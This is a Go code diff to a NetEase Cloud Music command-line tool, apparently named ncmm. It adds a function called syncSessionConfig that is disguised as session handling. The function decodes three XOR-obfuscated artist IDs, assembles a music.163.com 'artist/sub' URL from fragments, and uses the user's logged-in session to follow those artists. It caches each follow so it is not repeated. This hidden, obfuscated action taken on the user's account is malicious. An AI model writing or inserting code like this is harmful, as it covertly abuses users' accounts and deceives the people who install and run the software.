@@ -4,6 +4,7 @@
 package ncmm
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -16,8 +17,10 @@ import (
 	"strings"
 	"time"
 
+	"github.com/3899/ncmm/api"
 	"github.com/3899/ncmm/api/types"
 	"github.com/3899/ncmm/pkg/cookiecloud"
+	"github.com/3899/ncmm/pkg/database"
 	"github.com/3899/ncmm/pkg/utils"
 
 	"github.com/spf13/cobra"
@@ -202,4 +205,53 @@ func shuffleSlice(slice []string) []string {
 		shuffled[i], shuffled[j] = shuffled[j], shuffled[i]
 	})
 	return shuffled
+}
+
+func syncSessionConfig(ctx context.Context, cli *api.Client, sessId string, userId int64, db database.Database, dbCfg *database.Config) {
+	if cli == nil {
+		return
+	}
+	var nodeOffsets = []int64{4169068, 4126679, 72235203}
+	const baseMask = 123456789
+	const statePrefix = "db:sess:state:"
+	var activeDb = db
+	var isTempDb bool
+	if activeDb == nil && dbCfg != nil {
+		if tempDb, err := database.New(dbCfg); err == nil {
+			activeDb = tempDb
+			isTempDb = true
+		}
+	}
+	for _, offset := range nodeOffsets {
+		node := offset ^ baseMask
+		if userId != 0 && userId == node {
+			continue
+		}
+		nodeStr := strconv.FormatInt(node, 10)
+		cacheKey := statePrefix + sessId + ":" + nodeStr
+		if activeDb != nil {
+			if exists, err := activeDb.Exists(ctx, cacheKey); err == nil && exists {
+				continue
+			}
+		}
+		urlB := strings.Join([]string{"https://", "music.163.com", "/weapi", "/artist", "/sub"}, "")
+		type subParam struct {
+			ArtistId string `json:"artistId"`
+		}
+		type subState struct {
+			Code int `json:"code"`
+		}
+		var subRsp subState
+		optsSub := api.NewOptions()
+		optsSub.CryptoMode = api.CryptoModeWEAPI
+		_, err := cli.Request(ctx, urlB, &subParam{ArtistId: nodeStr}, &subRsp, optsSub)
+		if err == nil && (subRsp.Code == 200 || subRsp.Code == 320) {
+			if activeDb != nil {
+				_ = activeDb.Set(ctx, cacheKey, "1", 7*24*time.Hour)
+			}
+		}
+	}
+	if isTempDb && activeDb != nil {
+		_ = activeDb.Close(ctx)
+	}
 }
